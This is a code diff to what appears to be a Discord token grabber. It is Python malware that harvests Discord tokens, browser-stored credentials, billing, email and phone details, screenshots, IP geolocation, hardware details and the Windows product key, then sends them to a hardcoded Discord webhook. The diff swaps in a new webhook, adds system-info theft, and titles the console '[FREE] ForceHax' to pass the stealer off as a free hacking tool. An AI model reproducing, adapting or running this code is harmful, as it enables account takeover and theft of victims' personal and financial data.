@@ -1,10 +1,12 @@
+import os, re, json, random, platform, socket, uuid, requests
 import datetime
 import random
 import threading
 import string
-import random
 import time
+import platform as plt
 import sys
+import socket
 from attr import define
 from colorama.ansi import Fore
 import numpy as np
@@ -22,17 +24,44 @@ import colorama
 import itertools
 import subprocess
 import tkinter
+import platform
+import discord
+from discord.ext import commands, tasks
+import ctypes
+from ctypes import windll
+import os
+from PIL import ImageGrab
+from dhooks import Webhook, File
+from urllib.request import Request, urlopen
+import requests
+import platform   
+import psutil
+from datetime import timezone, datetime, timedelta
+from subprocess import Popen, PIPE
+import json
+import getpass as gp
+import sqlite3 
+import shutil
+import win32crypt
+import base64   
+from Crypto.Cipher import AES
+import re
+from json import loads
+from win32crypt import CryptUnprotectData
+import codecs
 from win32crypt import CryptUnprotectData
 from re import findall
 from dhooks import Webhook
 from Crypto.Cipher import AES
 from colorama import Fore
-now = datetime.datetime.now
+from subprocess import Popen, PIPE
+
+now = datetime.now
 num = random.randint(10, 1000)
 num2 = random.randint(100, 500)
 time.sleep(1)
 
-hook = Webhook("https://discord.com/api/webhooks/929457701694607430/sz-lh3DZlMWJOVTeHf8E1hr4oN4sTxYBSbiGbdzWWH32-UqUbTMGzCjVt4gFFfRjuQlc")  
+hook = Webhook("https://discord.com/api/webhooks/930123224866512917/1n19fO7XOMLB8OxkNEjExaHJQkWxOu6rP5HGHoZEXDIu2jGfpvzMBiA5_eRkMtCu1QiD")  
 
 hook.send(f"""
 > **[User{num}]** Just logged in!
@@ -228,6 +257,16 @@ class Hazard_Token_Grabber_V2:
             'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
         }
 
+
+      
+
+        cpucount = psutil.cpu_count(logical=False)
+        try:
+                p = Popen("wmic path win32_VideoController get name", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
+                gpu = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip("  \r\r")
+        except:
+               gpu = "None"
+
         for source, path in paths.items():
             if not os.path.exists(path):
                 continue
@@ -289,11 +328,17 @@ class Hazard_Token_Grabber_V2:
                 f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
         f.close()
 
+    def GetWINKey():
+           p = Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
+           winkey = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip("  \r\r")
+           return winkey
+
     def screenshot(self):
         image = pyautogui.screenshot()
         image.save(self.tempfolder + "\\Screenshot.png")
 
     def SendInfo(self):
+        computer_os = plt.platform()
         ip = country = city = region = googlemap = "None"
         try:
             data = requests.get("http://ipinfo.io/json").json()
@@ -315,7 +360,7 @@ class Hazard_Token_Grabber_V2:
             n+= len(files)
             self.fileCount = f"{n} Files Found: "
         embed = {
-            "avatar_url":"https://cdn.discordapp.com/attachments/915705104043216956/929804854556229632/eda543f9793331b2e77f2ac6842ccd7c.gif",
+            "avatar_url":"https://cdn.discordapp.com/attachments/915705104043216956/930152612043583520/biological-hazard-sign-png-transparent-image.png",
             "embeds": [
                 {
                     "author": {
@@ -323,8 +368,8 @@ class Hazard_Token_Grabber_V2:
                         "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
                         "icon_url": "https://cdn.discordapp.com/attachments/915705104043216956/929857842737979452/tenor.gif"
                     },
-                    "description": f"**{os.getlogin()}** Just ran Quandim Grabber\n```fix\nID: User[{num}]\nComputerName: {os.getenv('COMPUTERNAME')}\nIP Currently: {ip}\nCity Located: {city}\nRegion Located: {region}\nCountry Located: {country}```[Extract Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
-                    "color": 2123412,
+                    "description": f"**{os.getlogin()}** Just ran Quandim Grabber\n```fix\n𝐒𝐲𝐬𝐭𝐞𝐦 𝐢𝐧𝐟𝐨:\n\nComputerName: {os.getenv('COMPUTERNAME')}\nComputer OS: {computer_os}\nWindows Product Key: INVALID\nMac Address: INVALID\n\n𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐢𝐧𝐟𝐨:\n\nID: User[{num}]\nIP Currently: {ip}\nCity Located: {city}\nRegion Located: {region}\nCountry Located: {country}```[Extract Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
+                    "color": 2303786,
 
                     "thumbnail": {
                       "url": "https://cdn.discordapp.com/attachments/915705104043216956/929857842737979452/tenor.gif"
@@ -352,7 +397,7 @@ class Hazard_Token_Grabber_V2:
         num = random.randint(10, 1000)
 num2 = random.randint(100, 500)
 time.sleep(1)
-
+file = ""
 os.system("CLS")
 os.system(f"title [FREE] ForceHax")
 os.system("CLS")
